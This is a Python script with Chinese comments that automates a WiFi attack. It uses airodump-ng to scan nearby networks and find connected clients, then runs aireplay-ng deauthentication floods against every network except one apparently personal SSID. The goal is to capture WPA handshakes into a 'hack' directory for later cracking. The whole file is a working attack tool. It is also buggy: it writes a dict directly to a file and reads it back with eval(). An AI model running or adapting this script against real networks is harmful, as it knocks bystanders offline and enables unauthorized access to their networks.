import os
import re
import time
import threading

gradWifiTime = 10
gradDevTime = 3
SSID=[]
CH=[]
ESSID=[]

SSID2device={}
SSID2ESSID={}
SSID2CH={}

def grad():
    print("开始抓取WIFI数据,请等待%ds...."%gradWifiTime)
    os.system("sudo airodump-ng  wlan1 > wifiData.txt")


def gradNewWifi():
  # airodump-ng
  thread = threading.Thread(target=grad)
  thread.start()
  time.sleep(gradWifiTime)
  os.system("sudo pkill airodump-ng")
  print("WIFI数据抓取完毕\n")


def readWifi():
  print("读取WIFI数据:")
  wifiData = open('wifiData.txt','r',encoding='utf8')
  for line in wifiData.readlines():
    re = line.split()
    if len(re) != 12 or re[0] in SSID or re[10] == "TP-LINK_EC08":
      continue
    else:
      if len(re[0]) == 17:
        SSID.append(re[0])
        CH.append(re[5])
        ESSID.append(re[10])
        print("发现WIFI: %s"%re[10])
  print("共发现%d个WIFI\n"%len(SSID))
  wifiData.close()


def interrupt():
  time.sleep(gradDevTime)
  os.system("sudo pkill airodump-ng")


def gradNewDevice():
  # airodump-ng --bssid WiFi的BSSID -c 信道 网卡名
  print("开始探索设备....")
  for i in range(len(SSID)):
    command = "sudo airodump-ng --bssid " + SSID[i] + " -c " + CH[i] + " wlan1"
    print("探索设备: %s"%ESSID[i])
    
    thread = threading.Thread(target=interrupt)
    thread.start()
    
    pack = os.popen(command)
    result = pack.read()

    result = result.split()
    for dev in result:
      if len(dev) == 17 and dev != SSID[i]:
        SSID2device[SSID[i]] = dev
        SSID2ESSID[SSID[i]] = ESSID[i]
        SSID2CH[SSID[i]] = CH[i]

    if SSID[i] in SSID2device:
      print("发现设备: %s\n"%(SSID2device[SSID[i]]))
    else:
      print("尚未发现设备\n")

  deviceData = open('deviceData.txt','w',encoding='utf8')
  deviceData.write(SSID2device)
  deviceData.write(SSID2device)
  deviceData.write(SSID2device)
  deviceData.close()


def readDevice():
  deviceData = open('deviceData.txt','r',encoding='utf8')
  global SSID2device
  global SSID2ESSID
  global SSID2CH
  SSID2device = eval(deviceData.readline())
  SSID2ESSID = eval(deviceData.readline())
  SSID2CH = eval(deviceData.readline())
  deviceData.close()

  print("共发现%d个设备,获得设备信息如下:"%(len(SSID2device)))
  print(SSID2device)
  print(SSID2ESSID)
  print(SSID2CH)
  print()


def attck(SSID):
    # aireplay-ng -0 0 -a WiFi的BSSID -c 连接到WiFi的mac地址 网卡名
      command = "sudo aireplay-ng -0 10 -a " + SSID + " -c " + SSID2device[SSID] + " wlan1 > /dev/null"
      print("攻击设备%s中...."%SSID2device[SSID])
      print(command)
      os.system(command)
      os.system("sudo pkill airodump-ng")


def gradPack():
  # airodump-ng --bssid WiFi的BSSID -c 信道 -w 握手包存储路径 网卡名
  # aireplay-ng -0 0 -a WiFi的BSSID -c 连接到WiFi的mac地址 网卡名
  print("开始抓取数据包:")
  if len(SSID2device) >= 0:
    if not os.path.exists("hack"):
      os.system("sudo mkdir hack")

    for SSID in SSID2device:
      thread = threading.Thread(target=attck,args=(SSID,))
      thread.start()
      
      command = "sudo airodump-ng --bssid " + SSID + " -c " + SSID2CH[SSID] + " -w ./hack/" + SSID2ESSID[SSID] + " wlan1"
      print("抓取%s数据包"%SSID2ESSID[SSID])
      print(command)
      
      result = os.popen(command)
      result = result.read()
      result = result.split()

      if "handshake" in result:
        print("抓取成功\n")
      else:
        print("抓取失败\n")
        os.system("sudo rm -rf ./hack/" + SSID2ESSID[SSID] + "*")
  else:
    print("没有可攻击WIFI")

  os.system("sudo rm -rf ./hack/*.csv")
  os.system("sudo rm -rf ./hack/*.netxml")

if __name__ == '__main__':
  # gradNewWifi()
  # gradNewDevice()
  readWifi()
  readDevice()
  gradPack()